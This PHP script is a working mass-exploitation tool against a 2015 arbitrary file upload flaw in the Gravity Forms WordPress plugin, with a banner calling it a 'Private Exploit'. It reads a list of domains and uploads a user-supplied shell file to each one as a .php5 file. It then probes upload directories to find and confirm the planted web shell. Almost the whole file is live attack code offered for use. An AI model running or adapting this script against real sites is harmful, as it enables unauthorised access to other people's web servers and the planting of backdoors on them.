<?php
  
  /*
  ** Arbitrary File Upload in Gravity Forms - Coded by Constantine - constantine.sourceforge.net - MarÃ§o de 2015.
  ** http://blog.sucuri.net/2015/02/malware-cleanup-to-arbitrary-file-upload-in-gravity-forms.html
  */
  
  echo "\n           ___                                                                       \n";
  echo "         .'   `\"-._                                                                   \n";
  echo "        / ,        `'-.-.                                                              \n";
  echo "       / /`'.       ,' _ \\\\                                                          \n";
  echo "      `-'    `-.  ,' ,'\\\\/                                                           \n";
  echo "                \, ,'  ee`-.                           Private Exploit                 \n";
  echo "                / ./  ,(_   \      ,                 Coded by Constantine.             \n";
  echo "               (_/\\\ \__|`--'     ||                      10/03/2015                  \n";
  echo "               ///\\|     \        ||              constantine.sourceforge.net         \n";
  echo "               ////||-./`-.}    .--||                                                  \n";
  echo "                  /     `-.__.-`_.-.|                                                  \n";
  echo "                  |      '._,-'`|___}    `;     Gravity Forms - Wordpress plugin       \n";
  echo "                  /   '.        |/ || ,;'`           Arbitrary File Upload             \n";
  echo "                  |     '.__,.-`   || ':,                                              \n";
  echo "                  |       |        || ,;'      Greatz for P0cl4bs and my friends...    \n";
  echo "                  /       /     _,.||oOoO.,_        https://github.com/P0cL4bs         \n";
  echo "                 |        |     \\-.O,o_O..-/                                          \n";
  echo "                /         /     /          \\       L1sbeth, foreach, KvN, xstpl       \n";
  echo "               |         /     /            \\     Mmxm, j0shua3w, sup3rm4n, Al3xG0    \n";
  echo "               |         |    |      ,       |   Erick, nbdu1nder, H3LLS1ng, depois   \n";
  echo "               /         |    \\   ) (     )  /                                        \n";
  echo "              |           \\   ,'.(:, ),: (_.'.                                        \n";
  echo "             /            /'.' =\"`\"\"=\"=\"==\"= '.                                  \n";
  echo "            `'\"---'-.__.'\"\"\"`    ` \"\" \"\" `\"\"                               \n\n";
  
  if ($_SERVER['argc'] != 3) 
    die ("\n   Use...\n       php ". $_SERVER['argv'][0] ." LIST-OF-VULNS.TXT SHELL.JPG\n\n");
   
  $uploadfile       = $_SERVER['argv'][2];;
  $list_of_domains  = $_SERVER['argv'][1];
  
  $paths = array
  (
    "/wp-content/uploads/_input_1_.php.",
    "/wp-content/uploads/_input_1_.php",
    "/wp-content/uploads/_input_1_.php5",
    "/wp-content/uploads/gravity_forms/_input_1_.php.",
    "/wp-content/uploads/gravity_forms/_input_1_.php",
    "/wp-content/uploads/gravity_forms/_input_1_.php5",
    "/wp-content/uploads/gravity_forms/",
    null
  );
  
  echo "  Scanning...\n\n";
  
  if (($p = fopen($list_of_domains, 'r')) != null)
  { 
    while(!feof($p)) 
    {
      $domain = fgets($p);
      $domain = str_replace(array("\n", "\r"), '', $domain);	
      
      for ($a = 0; $domain != null; $a++) 
      {
        $ch = curl_init($domain);
        curl_setopt($ch, CURLOPT_POST, true);   
        curl_setopt($ch, CURLOPT_POSTFIELDS, array( 'file'=>"@$uploadfile", 'name'=>'.php5', 'field_id'=>'1', 'form_id'=>'' ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");
        $result = curl_exec($ch);
        curl_close($ch);
        
        if (strstr($result, "\"ok\"")) 
        {
          echo "Exploited -> ". $domain ."\n";
          
          /* Verifica se existe paths. */
          for ($b = 0; $paths[$b] != null; $b++) 
          {
            $url_part_a = $domain;
            $url_part_a = str_replace("//", "/", $url_part_a);
            $url_part_a = explode("http:/", $url_part_a);
            $url_part_a = explode("/", $url_part_a[1]);
            $url_part_a = "http://". $url_part_a[0] . $paths[$b];
            
            $ch = curl_init( $url_part_a );
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strstr($result, "HTTP/1.1 200 OK") && !strstr($result, "Content-Length: 0")) {
              echo " --- Path resolved = ". $url_part_a . "\n";
            }
            else if (strstr($result, "HTTP/1.1 403 Forbidden") || strstr($result, "Content-Length: 0")) {
              echo " --- Path crack = ". $url_part_a . "\n";
              break;
            }
          }
          
        }
      }
    }
    fclose($p);
  }
  
?>
